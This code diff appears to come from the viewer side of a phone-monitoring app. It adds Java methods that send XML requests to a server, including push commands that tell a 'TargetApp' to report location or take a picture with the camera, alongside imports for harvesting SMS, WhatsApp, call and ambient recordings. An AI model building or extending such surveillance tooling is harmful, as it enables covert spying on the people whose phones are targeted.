@@ -45,6 +45,8 @@ import static com.scp.viewer.API.Global.DEFAULT_DATETIME_FORMAT;
 import static com.scp.viewer.API.Global.DEFAULT_DATE_FORMAT;
 import static com.scp.viewer.API.Global.DEFAULT_DATE_FORMAT_MMM;
 import static com.scp.viewer.API.Global.FACEBOOK_TOTAL;
+import static com.scp.viewer.API.Global.FUNCTION_NAME_GET_CONNECTION_INFO;
+import static com.scp.viewer.API.Global.FUNCTION_NAME_PUSH_NOTIFICATION;
 import static com.scp.viewer.API.Global.HANGOUTS_TOTAL;
 import static com.scp.viewer.API.Global.INSTAGRAM_TOTAL;
 import static com.scp.viewer.API.Global.LENGHT;
@@ -59,6 +61,7 @@ import static com.scp.viewer.API.Global.SMS_SKYPE_TYPE;
 import static com.scp.viewer.API.Global.SMS_TOTAL;
 import static com.scp.viewer.API.Global.SMS_VIBER_TYPE;
 import static com.scp.viewer.API.Global.SMS_WHATSAPP_TYPE;
+import static com.scp.viewer.API.Global.TYPE_CHECK_CONNECTION;
 import static com.scp.viewer.API.Global.VIBER_TOTAL;
 import static com.scp.viewer.API.Global.WHATSAPP_TOTAL;
 import static com.scp.viewer.Database.Entity.AmbientRecordEntity.COLUMN_CREATED_DATE_AMBIENTRECORD;
@@ -559,6 +562,44 @@ public class APIMethod {
     }
 
 
+
+    /**
+     * GetJsonFeature is a method of creating available values to send to the server and receive data.
+     * @param table to get Device_ID.
+     * @param mineDate You want to get data from what position in the database of that feature.
+     * @param function_Name: is the feature name you want to get data about such as SMS, Calls, Locations.
+     * * Using in class:
+     *         - HistoryLocation.class,
+     *         - PhotoHistory.class,
+     *         - PhoneCallRecording.class,
+     *         - SyncSettings.class,
+     */
+    public static String GetJsonNowFeature(Table table, String mineDate, String function_Name)
+    {
+        Log.d("GetJsonNowFeature", table.getDevice_Identifier() + "");
+        // max_Date is get all the location from the min_date to the max_Date days
+        String max_Date = getDateNowInMaxDate();
+        Log.d("GetJsonNowFeature", max_Date + "");
+        String value = "<RequestParams Device_ID=\"" + table.getDevice_Identifier() + "\" Start=\"0\" Length=\"1\" Min_Date=\"" + mineDate + "\" Max_Date=\"" + max_Date + "\" />";
+        return APIURL.POST(value, function_Name);
+    }
+
+
+    /**
+     * GetJsonCheckConnectionFeature is a method of creating available values to send to the server and receive data.
+     * - DashBoard.class,
+     */
+    public static String GetJsonCheckConnectionFeature(String device_Identifier)
+    {
+        Log.d("GetJsonNowFeature", device_Identifier + "");
+        // max_Date is get all the location from the min_date to the max_Date days
+        String max_Date = getDateNowInMaxDate();
+        Log.d("GetJsonNowFeature", max_Date + "");
+        String value = "<RequestParams Device_ID=\"" + device_Identifier + "\"/>";
+        return APIURL.POST(value, FUNCTION_NAME_GET_CONNECTION_INFO);
+    }
+
+
     /**
      * GetJsonFeature is a method of creating available values to send to the server and receive data.
      * @param device_Id to get Device_ID.
@@ -582,6 +623,23 @@ public class APIMethod {
     {
         String value = "<RequestParams Device_ID=\"" + device_ID + "\" List_ID=\"" + list_ID + "\" />";
         return APIURL.POST(value, function_Name);
+    }
+
+    /**
+     * PostPushNotificationToServer This is the common method for push notification protocols from ViewerApp to TargetApp.
+     */
+    public static String PostPushNotificationToServer(String device_ID, String device_Row_ID, String type, int use_Camera)
+    {
+        String value;
+        if(use_Camera != 0)
+        {
+            value = "<RequestParams Device_ID=\""+ device_ID +"\" Device_Row_ID=\""+ device_Row_ID +"\" Type=\"" +type + "\"  Use_Camera=\"" + use_Camera + "\"></RequestParams>";
+        }
+        else {
+            value = "<RequestParams Device_ID=\""+ device_ID +"\" Device_Row_ID=\""+device_Row_ID +"\" Type=\"" + type + "\"></RequestParams>";
+        }
+
+        return APIURL.POST(value, FUNCTION_NAME_PUSH_NOTIFICATION);
     }
 
     /**
@@ -665,6 +723,63 @@ public class APIMethod {
         });
 
         builder.show();
+    }
+
+    /**
+     * getMilliFromDate
+     */
+    public static long getMilliFromDate(String dateFormat) {
+        Date date = new Date();
+        @SuppressLint("SimpleDateFormat") SimpleDateFormat formatter = new SimpleDateFormat(DEFAULT_DATETIME_FORMAT);
+        try {
+            date = formatter.parse(dateFormat);
+        } catch (ParseException e) {
+            e.printStackTrace();
+        }
+        System.out.println("Today is " + date);
+        return date.getTime();
+    }
+
+
+    @SuppressLint("StaticFieldLeak")
+    public static class PushNotification extends AsyncTask<String, Void, String> {
+        String device_Identifier, type, device_ID;
+        int camera_Use;
+
+        public PushNotification(String device_Identifier, String type, String device_ID, int camera_Use) {
+            this.device_Identifier = device_Identifier;
+            this.type = type;
+            this.device_ID = device_ID;
+            this.camera_Use = camera_Use;
+        }
+
+        @Override
+        protected String doInBackground(String... strings) {
+            Log.d("device_Identifier", device_Identifier + "");
+            /*String value = <RequestParams Device_ID="b7540860be17094e" Device_Row_ID="7" Type="take_a_picture"  Use_Camera="2"  Brand_ID="1"></RequestParams>;
+            String function = POST_CLEAR_MULTI_GPS;*/
+            // PostPushNotificationToServer(String device_ID, String device_Row_ID, String type, int use_Camera, int brand_ID)
+            return PostPushNotificationToServer(device_ID, device_Identifier, type, camera_Use);
+        }
+
+        @Override
+        protected void onPostExecute(String s) {
+            APIURL.deviceObject(s);
+            Log.d("PushNotification", APIURL.bodyLogin.getDescription() + "==" + "" + APIURL.bodyLogin.getResultId() + "" + APIURL.bodyLogin.getIsSuccess());
+            if (APIURL.bodyLogin.getIsSuccess().equals("1") && APIURL.bodyLogin.getResultId().equals("1")) {
+
+                // handle whether push notification to target phone
+                // if yes, wait 10 seconds to get location history
+                // if the send fails, tell the user that the current error is not getting-gps-now
+
+            } else {
+                /*Toast.makeText(HistoryLocation.this, APIURL.bodyLogin.getDescription() + "", Toast.LENGTH_SHORT).show();*/
+                // if the send fails, tell the user that the current error is not getting-gps-now
+            }
+            // get Method getThread()
+            //getThread(progressDialog);
+           // APIMethod.progressDialog.dismiss();
+        }
     }
 
 }
